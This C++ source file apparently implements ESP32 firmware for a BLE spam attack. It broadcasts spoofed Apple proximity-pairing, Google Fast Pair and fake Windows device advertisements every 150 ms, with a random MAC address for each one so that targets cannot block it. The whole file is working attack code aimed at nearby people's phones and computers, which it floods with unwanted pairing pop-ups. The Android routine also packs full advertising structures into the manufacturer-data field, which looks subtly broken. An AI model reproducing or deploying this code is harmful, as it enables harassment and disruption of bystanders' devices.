#include "ble_spam_all.h"
#include <string.h>
// Uses raw NimBLE GAP API for random MAC per advertisement - same approach as ble_spam.cpp

static uint8_t APPLE_PAYLOADS[][9] = {
  {0x4C,0x00, 0x10,0x05,0xC1,0x01,0x00,0x00,0x00},
  {0x4C,0x00, 0x10,0x05,0xC1,0x06,0x00,0x00,0x00},
  {0x4C,0x00, 0x10,0x05,0xC1,0x0B,0x00,0x00,0x00},
  {0x4C,0x00, 0x10,0x05,0xC1,0x0D,0x00,0x00,0x00},
  {0x4C,0x00, 0x10,0x05,0xC1,0x20,0x00,0x00,0x00},
};
static const int N_APPLE = 5;

static const uint32_t ANDROID_MODELS[] = {
  0xCD8256, 0xF52494, 0x718FA4, 0x821F66, 0x92BBBD, 0x0001F0, 0xEC0C14,
};
static const int N_ANDROID = 7;

static const char* WINDOWS_NAMES[] = {
  "Instant Hotspot","Bluetooth Keyboard","BT Headphones",
  "Wireless Mouse","BT Speaker","Galaxy Buds",
};
static const int N_WINDOWS = 6;

static void _sendRaw(const uint8_t* mfr_data, uint8_t mfr_len, bool includeFlags=true) {
  ble_gap_adv_stop();
  ble_addr_t rnd;
  ble_hs_id_gen_rnd(1, &rnd);
  ble_hs_id_set_rnd(rnd.val);

  struct ble_hs_adv_fields fields = {};
  if(includeFlags) fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
  fields.mfg_data     = (uint8_t*)mfr_data;
  fields.mfg_data_len = mfr_len;
  ble_gap_adv_set_fields(&fields);

  struct ble_gap_adv_params params = {};
  params.conn_mode   = BLE_GAP_CONN_MODE_NON;
  params.disc_mode   = BLE_GAP_DISC_MODE_GEN;
  params.itvl_min    = 0x0020;
  params.itvl_max    = 0x0030;
  params.channel_map = BLE_GAP_ADV_DFLT_CHANNEL_MAP;
  ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &params, NULL, NULL);
}

void BLESpamAll::begin() { _running=false; _sent=0; }

bool BLESpamAll::start(int mode) {
  _mode=mode; _sent=0; _lastTx=0; _running=true;
  const char* mn[]={"Apple","Android","Windows","ALL"};
  Serial.printf("BLESpamAll: started mode=%s\n", mn[mode<4?mode:3]);
  return true;
}

void BLESpamAll::stop() {
  _running=false;
  ble_gap_adv_stop();
  Serial.printf("BLESpamAll: stopped, sent=%d\n", _sent);
}

void BLESpamAll::sendApple() {
  int idx = random(N_APPLE);
  uint8_t p[9]; memcpy(p, APPLE_PAYLOADS[idx], 9);
  p[6]=random(256); p[7]=random(256); p[8]=random(256);
  _sendRaw(p, 9);
}

void BLESpamAll::sendAndroid() {
  uint32_t model = ANDROID_MODELS[random(N_ANDROID)];
  // Build raw AD structure: [len][type=0x16 svc data][UUID16 LE][model ID 3 bytes]
  // Google Fast Pair UUID = 0xFE2C
  uint8_t mfr[14];
  uint8_t i=0;
  mfr[i++]=3;    mfr[i++]=0x03;  // UUID16 list: length=3
  mfr[i++]=0x2C; mfr[i++]=0xFE;  // UUID 0xFE2C LE
  mfr[i++]=6;    mfr[i++]=0x16;  // Service data: length=6
  mfr[i++]=0x2C; mfr[i++]=0xFE;  // UUID 0xFE2C LE
  mfr[i++]=(model>>16)&0xFF;
  mfr[i++]=(model>>8)&0xFF;
  mfr[i++]=(model>>0)&0xFF;
  // Use manufacturer data field to carry the raw payload
  _sendRaw(mfr, i);
}

void BLESpamAll::sendWindows() {
  const char* name = WINDOWS_NAMES[random(N_WINDOWS)];
  NimBLEDevice::setDeviceName(name);

  ble_gap_adv_stop();
  ble_addr_t rnd; ble_hs_id_gen_rnd(1,&rnd); ble_hs_id_set_rnd(rnd.val);

  struct ble_hs_adv_fields fields = {};
  fields.flags = 0x02;  // LE General Discoverable only
  fields.name = (uint8_t*)name;
  fields.name_len = strlen(name);
  fields.name_is_complete = 1;
  ble_gap_adv_set_fields(&fields);

  struct ble_gap_adv_params params = {};
  params.conn_mode=BLE_GAP_CONN_MODE_NON; params.disc_mode=BLE_GAP_DISC_MODE_GEN;
  params.itvl_min=0x0020; params.itvl_max=0x0030;
  params.channel_map=BLE_GAP_ADV_DFLT_CHANNEL_MAP;
  ble_gap_adv_start(BLE_OWN_ADDR_RANDOM,NULL,BLE_HS_FOREVER,&params,NULL,NULL);
}

void BLESpamAll::tick() {
  if(!_running) return;
  if(millis()-_lastTx < 150) return;
  _lastTx=millis();

  switch(_mode) {
    case BLE_SPAM_APPLE:   sendApple();   break;
    case BLE_SPAM_ANDROID: sendAndroid(); break;
    case BLE_SPAM_WINDOWS: sendWindows(); break;
    default:
      switch(random(3)){
        case 0: sendApple();   break;
        case 1: sendAndroid(); break;
        case 2: sendWindows(); break;
      }
  }
  _sent++;
}
